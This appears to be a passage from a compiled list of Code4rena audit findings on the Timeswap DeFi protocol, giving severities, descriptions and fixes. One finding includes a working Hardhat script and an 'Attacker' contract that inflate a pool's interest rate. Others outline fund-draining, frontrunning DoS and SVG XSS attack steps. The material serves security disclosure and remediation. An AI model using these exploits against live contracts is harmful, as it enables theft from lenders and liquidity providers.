    IPair.State memory state,
    uint112 xDecrease,
    uint112 zIncrease
) internal view returns (uint112 collateralIn) {
    uint256 _collateralIn = maturity;
    _collateralIn -= block.timestamp;
    _collateralIn *= zIncrease;
    _collateralIn = _collateralIn.shiftRightUp(25);
    uint256 minimum = state.z;
    minimum *= xDecrease;
    uint256 denominator = state.x;
    denominator -= xDecrease;
    minimum = minimum.divUp(denominator);
    _collateralIn += minimum;
    collateralIn = _collateralIn.toUint112();
}
```

#### Proof of Concept

Near the maturity time, the attacker can do the following:

1.  `borrow()` a dust amount of assets (`xDecrease` = 1 wei) and increase `pool.state.z` to an extremely large value (20x of previous `state.z` in our tests);
2.  `pay()` the loan and get back the collateral;
3.  `lend()` a regular amount of `state.x`, get a large amount of insurance token;
4.  `burn()` the insurance token and get a large portion of the collateral assets from the defaulted loans.

#### Recommendation

Consider making `pair.borrow()` to be `onlyConvenience`, so that `zIncrease` will be a computed value (based on `xDecrease` and current state) rather than a user input value."
74.md,`TimeswapConvenience.sol#borrowGivenDebt()` Attacker can increase `state.y` to an extremely large value with a dust amount of `assetOut`,high,"<https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/BorrowMath.sol#L19-L53>

This issue is similar to the two previous issues related to `state.y` manipulation. Unlike the other two issues, this function is not on `TimeswapPair.sol` but on `TimeswapConvenience.sol`, therefore this can not be solved by adding `onlyConvenience` modifier.

Actually, we believe that it does not make sense for the caller to specify the interest they want to pay, we recommend removing this function.

#### Impact

*   When `pool.state.y` is extremely large, many core features of the protocol will malfunction, as the arithmetic related to `state.y` can overflow. For example:

LendMath.check(): <https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/LendMath.sol#L28-L28>

BorrowMath.check(): <https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L31-L31>

*   An attacker can set `state.y` to a near overflow value, then `lend()` to get a large amount of extra interest (as Bond tokens) with a small amount of asset tokens. This way, the attacker can steal funds from other lenders and liquidity providers."
74.md,Manipulation of the Y State Results in Interest Rate Manipulation,high,"Due to lack of constraints on user input in the `TimeswapPair.sol#mint` function, an attacker can arbitrarily modify the interest rate while only paying a minimal amount of Asset Token and Collateral Token.

Disclosure: This is my first time attempting Ethereum hacking, so I might have made some mistakes here since the math is quite complex, but I'm going to give it a go.

#### Proof of Concept

The attack scenario is this: A malicious actor is able to hyper-inflate the interest rate on a pool by triggering a malicious mint function. The malicious actor does this to attack the LP and other members of the pool.

Consider the following HardHat script:

```js
const hre = require(""hardhat"");


//jtok is asset
//usdc is collat

async function launchTestTokens(tokenDeployer){
    //Launch a token
    const TestToken = await ethers.getContractFactory(""TestToken"", signer=tokenDeployer);
    const tt = await TestToken.deploy(""JTOK"", ""JTOK"", 1000000000000000)
    const tt2 = await TestToken.deploy(""USDC"", ""USDC"", 1000000000000000)
    let res = await tt.balanceOf(tokenDeployer.address)
    let res2 = await tt.balanceOf(tokenDeployer.address)
    console.log(""JTOK balance: ""+res)
    console.log(""USDC balance: ""+res2)
    return [tt, tt2]
}

async function deployAttackersContract(attacker, jtok, usdc){
    const Att = await ethers.getContractFactory(""Attacker"", signer=attacker)
    const atakcontrak = await Att.deploy(jtok.address, usdc.address)
    return atakcontrak
}

async function deployLPContract(lp, jtok, usdc){
    const LP = await ethers.getContractFactory(""LP"", signer=lp)
    const lpc = await LP.deploy(jtok.address, usdc.address)
    return lpc
}

async function main() {
    const [tokenDeployer, lp, attacker] = await ethers.getSigners();
    let balance = await tokenDeployer.getBalance()
    let factory = await ethers.getContractAt(""TimeswapFactory"", ""0x5FbDB2315678afecb367f032d93F642f64180aa3"", signer=tokenDeployer)
    //let [jtok, usdc] = await launchTestTokens(tokenDeployer)
    let jtok = await ethers.getContractAt(""TestToken"", ""0x2279b7a0a67db372996a5fab50d91eaa73d2ebe6"", signer=tokenDeployer)
    let usdc = await ethers.getContractAt(""TestToken"", ""0x8a791620dd6260079bf849dc5567adc3f2fdc318"", signer=tokenDeployer)
    console.log(""Jtok: ""+jtok.address)
    console.log(""USDC: ""+usdc.address)

    //Create Pair
    //let txn = await factory.createPair(jtok.address, usdc.address)
    pairAddress = await factory.getPair(jtok.address, usdc.address)
    pair = await ethers.getContractAt(""TimeswapPair"", pairAddress, signer=tokenDeployer)
    console.log(""Pair address: ""+pairAddress);

    // Deploy LP
    //let lpc = await deployLPContract(lp, jtok, usdc)
    let lpc = await ethers.getContractAt(""LP"", ""0x948b3c65b89df0b4894abe91e6d02fe579834f8f"", signer=lp)


    let jtokb = await jtok.balanceOf(lpc.address)
    let usdcb = await usdc.balanceOf(lpc.address)
    console.log(""LP Jtok: ""+jtokb)
    console.log(""LP USDC: ""+usdcb)

    //let txn2 = await lpc.timeswapMint(1641859791, 15, pairAddress)
    let res = await pair.constantProduct(1641859791);
    console.log(""Post LP Constants:"", res);

    let atakcontrak = await deployAttackersContract(attacker, jtok, usdc)

    jtokb = await jtok.balanceOf(atakcontrak.address)
    usdcb = await usdc.balanceOf(atakcontrak.address)
    console.log(""Attacker Jtok: ""+jtokb)
    console.log(""Attacker USDC: ""+usdcb)

    //mint some tokens
    let txn2 = await atakcontrak.timeswapMint(1641859791, 15, pairAddress)

    let res2 = await pair.constantProduct(1641859791);
    console.log(""Post Attack Constants:"", res2);

}
main().then(()=>process.exit(0))

```

First, the LP deploys their pool and contributes their desired amount of tokens with the below contract:

```solidity
pragma solidity =0.8.4;

import ""hardhat/console.sol"";
import {ITimeswapMintCallback} from ""./interfaces/callback/ITimeswapMintCallback.sol"";
import {IPair} from ""./interfaces/IPair.sol"";
import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';
interface TestTokenLP is IERC20{
    function mmint(uint256 amount) external;
}

contract LP is ITimeswapMintCallback {

    uint112 constant SEC_PER_YEAR = 31556926;
    TestTokenLP internal jtok;
    TestTokenLP internal usdc;

constructor(address _jtok, address _usdc){
    jtok = TestTokenLP(_jtok);
    jtok.mmint(10_000 ether);
    usdc = TestTokenLP(_usdc);
    usdc.mmint(10_000 ether);
}

function timeswapMint(uint maturity, uint112 APR, address pairAddress) public{
    uint256 maturity = maturity;
    console.log(""Maturity: "", maturity);
    address liquidityTo = address(this);
    address dueTo = address(this);
    uint112 xIncrease = 5_000 ether;
    uint112 yIncrease = (APR*xIncrease)/(SEC_PER_YEAR*100);
    uint112 zIncrease = (5*xIncrease)/3; //Static 167% CDP
    IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, """");
}


function timeswapMintCallback(
        uint112 assetIn,
        uint112 collateralIn,
        bytes calldata data
    ) override external{
        jtok.mmint(100_000 ether);
        usdc.mmint(100_000 ether);
        console.log(""Asset requested:"", assetIn);
        console.log(""Collateral requested:"", collateralIn);
        //check before
        uint256 beforeJtok = jtok.balanceOf(msg.sender);
        console.log(""LP jtok before"", beforeJtok);
        //transfer
        jtok.transfer(msg.sender, assetIn);
        //check after
        uint256 afterJtok = jtok.balanceOf(msg.sender);
        console.log(""LP jtok after"", afterJtok);
        //check before
        uint256 beforeUsdc = usdc.balanceOf(msg.sender);
        console.log(""LP USDC  before"", beforeUsdc);
        //transfer
        usdc.transfer(msg.sender, collateralIn);
        //check after
        uint256 afterUsdc = usdc.balanceOf(msg.sender);
        console.log(""LP USDC After"", afterUsdc);
        
    }
}

```

Here are the initialization values:
```solidity
uint112 xIncrease = 5_000 ether;
uint112 yIncrease = (APR*xIncrease)/(SEC_PER_YEAR*100);
uint112 zIncrease = (5*xIncrease)/3; //Static 167% CDP
```

With this configuration, I've calculated the interest rate to borrow on this pool using the functions defined here: <https://timeswap.gitbook.io/timeswap/deep-dive/borrowing>
to  be:

```
yMax: 4.7533146923118e-06
Min Interest Rate: 0.009374999999999765
Max Interest Rate: 0.14999999999999625
zMax: 1666.6666666666667

```

Around 1% to 15%.

Then, the attacker comes along (see line containing `let atakcontrak` and after). The attacker deploys the following contract:
```solidity
pragma solidity =0.8.4;

import ""hardhat/console.sol"";
import {ITimeswapMintCallback} from ""./interfaces/callback/ITimeswapMintCallback.sol"";
import {IPair} from ""./interfaces/IPair.sol"";
import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';
interface TestTokenAtt is IERC20{
    function mmint(uint256 amount) external;
}

contract Attacker is ITimeswapMintCallback {

    uint112 constant SEC_PER_YEAR = 31556926;
    TestTokenAtt internal jtok;
    TestTokenAtt internal usdc;

constructor(address _jtok, address _usdc){
    jtok = TestTokenAtt(_jtok);
    jtok.mmint(10_000 ether);
    usdc = TestTokenAtt(_usdc);
    usdc.mmint(10_000 ether);
}

function timeswapMint(uint maturity, uint112 APR, address pairAddress) public{
    uint256 maturity = maturity;
    console.log(""Maturity: "", maturity);
    address liquidityTo = address(this);
    address dueTo = address(this);
    uint112 xIncrease = 3;
    uint112 yIncrease = 1000000000000000;
    uint112 zIncrease = 5; //Static 167% CDP
    IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, """");
}


function timeswapMintCallback(
        uint112 assetIn,
        uint112 collateralIn,
        bytes calldata data
    ) override external{
        jtok.mmint(100_000 ether);
        usdc.mmint(100_000 ether);
        console.log(""Asset requested:"", assetIn);
        console.log(""Collateral requested:"", collateralIn);
        //check before
        uint256 beforeJtok = jtok.balanceOf(msg.sender);
        console.log(""Attacker jtok before"", beforeJtok);
        //transfer
        jtok.transfer(msg.sender, assetIn);
        //check after
        uint256 afterJtok = jtok.balanceOf(msg.sender);
        console.log(""Attacker jtok after"", afterJtok);
        //check before
        uint256 beforeUsdc = usdc.balanceOf(msg.sender);
        console.log(""Attacker USDC  before"", beforeUsdc);
        //transfer
        usdc.transfer(msg.sender, collateralIn);
        //check after
        uint256 afterUsdc = usdc.balanceOf(msg.sender);
        console.log(""Attacker USDC After"", afterUsdc);
        
    }
}
```

Which contains the following settings for a mint:
```solidity
uint112 xIncrease = 3;
uint112 yIncrease = 1000000000000000;
uint112 zIncrease = 5; //Static 167% CDP
```

According to my logs in hardhat:

```
Maturity:  1641859791
Callback before: 8333825816710789998373
Asset requested: 3
Collateral requested: 6
Attacker jtok before 5000000000000000000000
Attacker jtok after 5000000000000000000003
Attacker USDC  before 8333825816710789998373
Attacker USDC After 8333825816710789998379
Callback after: 8333825816710789998379
Callback expected after: 8333825816710789998379
```

The attacker is only required to pay 3 wei of Asset Token and 6 wei of Collateral token. However, after the attacker's malicious mint is up, the interest rate becomes:
```
yMax: 0.0002047533146923118
Min Interest Rate: 0.40383657499999975
Max Interest Rate: 6.461385199999996
zMax: 1666.6666666666667
```
Between 40 and 646 percent.

xyz values before and after:

```
Post LP Constants: [ BigNumber { value: ""5000000000000000000000"" },
  BigNumber { value: ""23766573461559"" },
  BigNumber { value: ""8333333333333333333333"" },
  x: BigNumber { value: ""5000000000000000000000"" },
  y: BigNumber { value: ""23766573461559"" },
  z: BigNumber { value: ""8333333333333333333333"" } ]
Attacker Jtok: 10000000000000000000000
Attacker USDC: 10000000000000000000000
Post Attack Constants: [ BigNumber { value: ""5000000000000000000003"" },
  BigNumber { value: ""1023766573461559"" },
  BigNumber { value: ""8333333333333333333338"" },
  x: BigNumber { value: ""5000000000000000000003"" },
  y: BigNumber { value: ""1023766573461559"" },
  z: BigNumber { value: ""8333333333333333333338"" } ]

```

This result in destruction of the pool."
74.md,Important state updates are made after the callback in the mint() function,high,"In TimeswapPair.sol, the `mint()` function has a callback in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to reserve asset, collateral, and totalDebtCreated) also violates the Checks Effects Interactions best practices further widening the attack surface.

#### Proof of Concept

- <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L177>

- <https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html>

- cross function reentrancy
<https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21>


#### Recommended Mitigation Steps

The callback Callback.mint(asset, collateral, xIncrease, dueOut.collateral, data) should be placed at the end of the mint() function after all state updates have taken place."
74.md,In the lend() function state updates are made after the callback,high,"In TimeswapPair.sol, the `lend()` function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to totalClaims bonds,  insurance and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.

#### Proof of Concept

- <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L246>

- <https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html>

- cross function reentrancy
<https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21>


#### Recommended Mitigation Steps

The callback Callback.lend(asset, xIncrease, data); should be placed at the end of the lend() function after all state updates have taken place."
74.md,borrow() function has state updates after a callback to msg.sender,high,"In TimeswapPair.sol, the `borrow()` function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to collateral, totalDebtCreated and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.

#### Proof of Concept

- <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L322>

- <https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html>

- cross function reentrancy
<https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21>

#### Recommended Mitigation Steps

The callback Callback.borrow(collateral, dueOut.collateral, data); should be placed at the end of the borrow() function after all state updates have taken place."
74.md,pay() function has callback to msg.sender before important state updates,high,"In TimeswapPair.sol, the `pay()` function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to reserves collateral and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.

#### Proof of Concept

- <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L369>

- <https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html>

- cross function reentrancy
<https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21>


#### Recommended Mitigation Steps

The callback ""if (assetIn > 0) Callback.pay(asset, assetIn, data);""  should be placed at the end of the pay() function after all state updates have taken place."
74.md,`burn()` doesn't call ERC721 `_burn()`,medium,"The CollateralizedDebt.sol contract is a ERC721 token. It has a `mint()` function, which uses the underlying `safeMint()` function to create an ERC721 token representing a collateral position. The `burn()` function in CollateralizedDebt.sol should reverse the actions of `mint()` by burning the ERC721 token, but the ERC721 `_burn()` function is never called. This means a user can continue to hold their ERC721 token representing their position after receiving their funds. This is unlike the `burn()` function found in Bond.sol, Insurance.sol, and Liquidity.sol, which all call the `_burn()` function (though note the `_burn()` function in these other Timeswap Convenience contracts is the ERC20 `_burn()`).

#### Proof of Concept

The problematic `burn()` function is found in CollareralizedDebt.sol
<https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L80-L88>

Compare this function to the `burn()` functions defined in the other Timeswap Convenience contracts, which contain calls to `_burn()`

#### Recommended Mitigation Steps

Include the following line in the `burn()` function
`_burn(id);`"
74.md,safeDecimals can revert causing DoS,medium,"The `safeDecimals()` function, found in the SafeMetadata.sol contract and called in 3 different Timeswap Convenience contracts, can cause a revert. This is because the safeDecimals function attempts to use abi.decode to return a uint8 when `data.length >= 32`. However, a data.length value greater than 32 will cause abi.decode to revert.

A similar issue was found in a previoud code4rena contest: <https://github.com/code-423n4/2021-05-nftx-findings/issues/46>

#### Proof of Concept

The root cause is [line 28](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L28) of the `safeDecimals()` function in SafeMetadata.sol

The following link shows the `safeDecimals()` function in the BoringCrypto library, which might be where this code was borrowed from, uses the strict equality check `data.length == 32`
<https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L54>

`safeDecimals()` is used in multiple functions such as

*   CollateralizedDebt.sol [line 50](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L50) and [line 54](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L54)
*   Bond.sol [line 34](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L34)
*   Insurance.sol [line 36](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L36)

#### Recommended Mitigation Steps

Modify the `safeDecimals()` function to change >= 32 to == 32 like this
`if (success && data.length == 32) return   abi.decode(data, (uint8));`"
74.md,`safeName()` can revert causing DoS,medium,"The `safeName()` function, found in the SafeMetadata.sol contract and called in 4 Timeswap Convenience contracts in the `name()` functions, can cause a revert. This could make the 4 contracts not compliant with the ERC20 standard for certain asset pairs, because the `name()` function should return a string and not revert.

The root cause of the issue is that the `safeName()` function assumes the return type of any ERC20 token to be a string. If the return value is not a string, abi.decode() will revert, and this will cause the `name()` functions in the Timeswap ERC20 contracts to revert. There are some tokens that aren't compliant, such as Sai from Maker, which returns a bytes32 value:
<https://kauri.io/#single/dai-token-guide-for-developers/#token-info>

Because this is known to cause issues with tokens that don't fully follow the ERC20 spec, the `safeName()` function in the BoringCrypto library has a fix for this. The BoringCrypto `safeName()` function is similar to the one in Timeswap but it has a `returnDataToString()` function that handles the case of a bytes32 return value for a token name:
<https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L47>

#### Proof of Concept

The root cause is [line 12](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L12) of the `safeName()` function in SafeMetadata.sol

The `safeName()` function is called in:

*   [Bond.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L20-L25)
*   [CollateralizedDebt.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L22-L36)
*   [Insurance.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L20-L27)
*   [Liquidity.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Liquidity.sol#L22-L29)

#### Recommended Mitigation Steps

Use the BoringCrypto `safeName()` function code to handle the case of a bytes32 return value:
<https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L47>"
74.md,`safeSymbol()` can revert causing DoS,medium,"The `safeSymbol()` function, found in the SafeMetadata.sol contract and called in 4 Timeswap Convenience contracts in the `symbol()` functions, can cause a revert. This could make the 4 contracts not compliant with the ERC20 standard for certain asset pairs, because the `symbol()` function should return a string and not revert.

The root cause of the issue is that the `safeSymbol()` function assumes the return type of any ERC20 token to be a string. If the return value is not a string, abi.decode() will revert, and this will cause the `symbol()` functions in the Timeswap ERC20 contracts to revert.

Because this is known to cause issues with tokens that don't fully follow the ERC20 spec, the `safeSymbol()` function in the BoringCrypto library has a fix for this. The BoringCrypto `safeSymbol()` function is similar to the one in Timeswap but it has a `returnDataToString()` function that handles the case of a bytes32 return value for a token name:
<https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L39>

#### Proof of Concept

The root cause is [line 20](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L20)  of the `safeSymbol()` function in SafeMetadata.sol

The `safeSymbol()` function is called in:

*   [Bond.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L27-L31)
*   [CollateralizedDebt.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L38-L42)
*   [Insurance.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L29-L33)
*   [Liquidity.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Liquidity.sol#L31-L35)

#### Recommended Mitigation Steps

Use the BoringCrypto `safeSymbol()` function code with the `returnDataToString()` parsing function to handle the case of a bytes32 return value:
<https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L39>"
74.md,XSS via SVG Construction contract,medium,"you, also found by 0x1f8b_

SVG is a unique type of image file format that is often susceptible to Cross-site scripting. If a malicious user is able to inject malicious Javascript into a SVG file, then any user who views the SVG on a website will be susceptible to XSS. This can lead stolen cookies, Denial of Service attacks, and more.

The `NFTTokenURIScaffold` contract generates a SVG via the `NFTSVG.constructSVG` function. One of the arguments used by the `NFTSVG.constructSVG` function is `svgTitle` which represents the ERC20 symbols of both the asset and collateral ERC20 tokens. When generating an ERC20 contract, a malicious user can set malicious XSS as the ERC20 symbol.

These set of circumstances leads to XSS when the SVG is loaded on any website.

#### Proof of Concept

1.  Hacker generates an ERC20 token with a symbol that contains malicious Javascript.
2.  Hacker generates a TimeSwap Pair with an asset or collateral that matches the malicious ERC20 token created in Step 1.
3.  When `NFTTokenURIScaffold#constructTokenURI` is called, a SVG is generated. This process works such that when generating the SVG the tainted ERC20 symbol created in Step 1 is [passed](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L90) to the `NFTSVG.constructSVG` function [here](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L102). This function returns a SVG [containing](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTSVG.sol#L27) the tainted ERC20 symbol.
4.  When the SVG is loaded on any site such as OpenSea, any user viewing that SVG will load the malicious Javascript from within the SVG and result in a XSS attack.


#### Recommended Mitigation Steps

Creating a SVG file inside of a Solidity contract is novel and thus requires the entity creating a SVG file to sanitize any potential user-input that goes into generating the SVG file.

As of this time there are no known Solidity libraries that sanitize text to prevent an XSS attack. The easiest solution is to remove all user-input data from the SVG file or not generate the SVG at all."
74.md,`TimeswapPair.sol#mint()` Malicious user/attacker can mint new liquidity with an extremely small amount of `yIncrease` and malfunction the pair with the maturity,medium,"<https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/MintMath.sol#L14-L34>

The current implementation of `TimeswapPair.sol#mint()` allows the caller to specify an arbitrary value for `yIncrease`.

However, since `state.y` is expected to be a large number based at `2**32`, once the initial `state.y` is set to a small number (1 wei for example), the algorithm won't effectively change `state.y` with regular market operations (`borrow`, `lend` and `mint`).

<https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L17-L37>

The pair with the maturity will malfunction and can only be abandoned.

A malicious user/attacker can use this to frontrun other users or the platform's `newLiquidity()` call to initiate a griefing attack.

If the desired `maturity` is a meaningful value for the user/platform, eg, end of year/quarter. This can be a noteworthy issue.

#### Recommendation

Consider adding validation of minimal `state.y` for new liquidity.

Can be `2**32 / 10000` for example."
74.md,no reentrancy guard on mint() function that has a callback,medium,"In CollateralizedDebt.sol, the mint() function calls \_safeMint() which has a callback to the ""to"" address argument.  Functions with callbacks should have reentrancy guards in place for protection against possible malicious actors both from inside and outside the protocol.

#### Proof of Concept

- <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L76>

- <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L263>

- <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L395>

#### Recommended Mitigation Steps

Add a reentrancy guard modifier on the mint() function in CollateralizedDebt.sol"
74.md,users might pay enormous amounts of gas,medium,"<https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/Mint.sol#L141>

when a user mints new liquidity, it the pair doesn't already exist, it deploys it.

deploying a new contract on ethereum is super expensive, especially when it's such a large contract like TimeswapPair, it can cost thousands of dollars.

<https://medium.com/the-capital/how-much-does-it-cost-to-deploy-a-smart-contract-on-ethereum-11bcd64da1>

#### Impact

user who try to mint liquidity on pair that doesn't exist will end up paying thousands of dollars.

#### Recommended Mitigation Steps

If the pair doesn't exist, revert instead of deploying it.
deploying a new contract should be the user's choice, since it's so expensive."
74.md,DOS pay function,medium,"in the `pay()` function users repay their debt and in line 364:
<https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L364>
it decreases their debt.

lets say a user wants to repay all his debt, he calls the `pay()` function with his full debt.
an attacker can see it and frontrun to repay a single token for his debt (since it's likely the token uses 18 decimals, a single token is worth almost nothing)
and since your solidity version is above 0.8.0 the line:
`due.debt -= assetsIn[i];` will revert due to underflow

The attacker can keep doing it everytime the user is going to pay and since 1 token is baisicly 0\$ (18 decimals) the attacker doesn't lose real money

#### Impact

A DoS on every user that  repay his full debt (or enough that the difference between his total debt to what he pays his negligible)

#### Proof of Concept

From solidity docs

Since Solidity 0.8.0, all arithmetic operations revert on over- and underflow by default, thus making the use of these libraries unnecessary.

#### Recommended Mitigation Steps

if `assetsIn[i]` is bigger than `due.debt` set `assetsIn[i]=due.debt` and `due.debt=0`"
74.md,Convenience contract fails to function if asset or collateral is an ERC20 token with fees,medium,"There are ERC20 tokens that collect fees with each transfer. If the asset or collateral used in a pair is of that type, the Convenience contract fails to function. It always sends the flat amount specified in the function's parameter. If the token collects fees, the amount the Pair contract receives is less than it expects to get and reverts the transaction.

#### Proof of Concept

The function used to trigger the callback function and verify the received value: <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L50>

Convenience contract's callback function uses the amount specified in `collateralIn` in the transfer function: <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L535>

If the token collects fees, the value the Pair contract receives will be less than `collateralIn`. The following require statement will fail: <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L52>

The same thing applies to all the other callback functions in the library.

This issue doesn't impact the Pair contract itself. Because of the safety checks for each callback, the contract always receives the amount it expects or the transaction is reverted. Meaning, the user has to adapt and cover the fees themselves. The convenience contract doesn't do that and thus always fails.

The only issue would be outgoing transfers. For example, if a borrower pays back their debt, the pair contract receives the correct amount. But, the borrower will receive less collateral because of the fees. Since there's no such check in those cases:
<https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L374>


 > Almost all tokens don't have this fee implementation. If someone wants to utilize this, they can create their own convenience contract to interact with Timeswap V1 Core"
59.md,Timelock can be bypassed,high,"The purpose of a Timelock contract is to put a limit on the privileges of the `governor`, by forcing a two step process with a preset delay time.

However, we found that the current implementation actually won't serve that purpose as it allows the `governor` to execute any transactions without any constraints.

